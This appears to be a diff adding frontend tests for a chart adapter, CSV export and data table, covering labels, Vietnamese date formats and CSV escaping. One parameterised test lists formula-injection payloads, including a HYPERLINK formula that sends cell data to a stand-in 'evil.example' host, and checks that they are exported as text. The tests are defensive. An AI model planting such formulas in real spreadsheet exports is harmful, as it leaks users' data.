@@ -3,7 +3,7 @@ import { afterEach, describe, expect, it, vi } from "vitest";
 
 import { TypeSwitcher } from "@/components/chat/TypeSwitcher";
 import { DataTable } from "@/components/chat/DataTable";
-import { formatTick, toCsv, toEChartsOption } from "@/lib/chart/toEChartsOption";
+import { formatCell, formatDate, formatTick, toCsv, toEChartsOption } from "@/lib/chart/toEChartsOption";
 import type { ChartSpec, Result } from "@/lib/contracts";
 import { I18nProvider } from "@/lib/i18n/react";
 
@@ -84,6 +84,14 @@ describe("chart adapter", () => {
     expect(scatter.series[0].data).toEqual([[8, 10], [20, 30], [25, 20]]);
   });
 
+  it("names a series after the metric's display name and cuts a long category label inside the chart", () => {
+    const labelled: Result = { ...BRANDS, columns: [BRANDS.columns[0], { ...BRANDS.columns[1], label: "Sales 2025" }, BRANDS.columns[2]] };
+    const bar = option(spec({ orientation: "horizontal", y: ["sales_2025", "sales_2024"] }), labelled) as unknown as
+      Option & { yAxis: { axisLabel: { width: number; overflow: string } } };
+    expect(bar.series.map((item) => (item as unknown as { name: string }).name)).toEqual(["Sales 2025", "sales_2024"]);
+    expect(bar.yAxis.axisLabel).toMatchObject({ width: 140, overflow: "truncate" });
+  });
+
   it("has no ECharts option for a KPI or a table", () => {
     expect(toEChartsOption(spec({ type: "kpi" }), BRANDS, PALETTE, "en")).toBeNull();
     expect(toEChartsOption(spec({ type: "table" }), BRANDS, PALETTE, "en")).toBeNull();
@@ -91,7 +99,30 @@ describe("chart adapter", () => {
 
   it("writes CSV with quoted commas, quotes and line breaks", () => {
     const tricky: Result = { columns: [{ name: "name", type: "string", role: "dimension" }, { name: "n", type: "number", role: "measure" }], rows: [['A, "B"\nC', 1]], row_count: 1 };
-    expect(toCsv(tricky)).toBe('name,n\n"A, ""B""\nC",1');
+    expect(toCsv(tricky)).toBe('\uFEFFname,n\r\n"A, ""B""\nC",1\r\n');
+  });
+
+  it("starts the CSV with a UTF-8 byte order mark so a spreadsheet reads Vietnamese text", () => {
+    const text: Result = { columns: [{ name: "tỉnh", type: "string", role: "dimension" }], rows: [["Hà Nội"]], row_count: 1 };
+    expect(toCsv(text)).toBe("\uFEFFtỉnh\r\nHà Nội\r\n");
+  });
+
+  it.each(["=1+1", "+1+1", "-1+1", "@SUM(A1)", "\tcmd", "\rcmd", '=HYPERLINK("http://evil.example/?"&A1,"click")'])(
+    "writes %j as text, not as a formula", (value) => {
+      const result: Result = { columns: [{ name: "v", type: "string", role: "dimension" }], rows: [[value]], row_count: 1 };
+      const cell = toCsv(result).slice("\uFEFFv\r\n".length, -2);
+      const unquoted = cell.startsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell;
+      expect(unquoted).toBe(`'${value}`);
+    });
+
+  it("leaves plain numbers, negative ones included, as numbers", () => {
+    const numbers: Result = { columns: [{ name: "n", type: "number", role: "measure" }], rows: [[-5], ["-5"], ["+3.5"], ["-1e3"], [0]], row_count: 5 };
+    expect(toCsv(numbers)).toBe("\uFEFFn\r\n-5\r\n-5\r\n+3.5\r\n-1e3\r\n0\r\n");
+  });
+
+  it("neutralises a column name that starts a formula", () => {
+    const named: Result = { columns: [{ name: "=cmd", type: "string", role: "dimension" }], rows: [], row_count: 0 };
+    expect(toCsv(named)).toBe("\uFEFF'=cmd\r\n");
   });
 });
 
@@ -143,6 +174,16 @@ describe("data table", () => {
     expect(screen.getByText("21")).toBeTruthy();
   });
 
+  it("heads a metric column with its display name and keeps the column name for sorting", () => {
+    const labelled: Result = { ...BRANDS, columns: [BRANDS.columns[0], { ...BRANDS.columns[1], label: "Sales 2025" }, BRANDS.columns[2]] };
+    render(<I18nProvider initial="en"><DataTable result={labelled} /></I18nProvider>);
+    const header = screen.getByRole("columnheader", { name: /Sales 2025/ });
+    expect(header.querySelector("button")?.getAttribute("title")).toContain("sales_2025");
+    expect(screen.getByRole("columnheader", { name: /sales_2024/ })).toBeTruthy();
+    // A narrow table stacks each row as a card whose lines are named the same way.
+    expect(screen.getAllByRole("cell")[1].getAttribute("data-label")).toBe("Sales 2025");
+  });
+
   it("sorts by a column when its header is clicked", () => {
     render(<I18nProvider><DataTable result={BRANDS} /></I18nProvider>);
 
@@ -150,5 +191,20 @@ describe("data table", () => {
 
     const cells = screen.getAllByRole("row").slice(1).map((row) => row.querySelector("td")?.textContent);
     expect(cells).toEqual(["A", "B", "C"]);
+  });
+});
+
+describe("dates of a column grouped to a grain", () => {
+  it("name the period in the interface language", () => {
+    expect(formatDate("2026-01-01", "month", "en")).toBe("Jan 2026");
+    expect(formatDate("2026-01-01", "month", "vi")).toMatch(/2026/);
+    expect(formatDate("2026-04-01", "quarter", "en")).toBe("Q2 2026");
+    expect(formatDate("2026-04-01", "quarter", "vi")).toBe("Quý 2 2026");
+    expect(formatDate("2026-01-01", "year", "en")).toBe("2026");
+  });
+
+  it("keep a plain date as it is", () => {
+    expect(formatDate("2026-01-15", null, "en")).toBe("2026-01-15");
+    expect(formatCell("2026-01-15", { type: "date", format: null }, "vi")).toBe("2026-01-15");
   });
 });
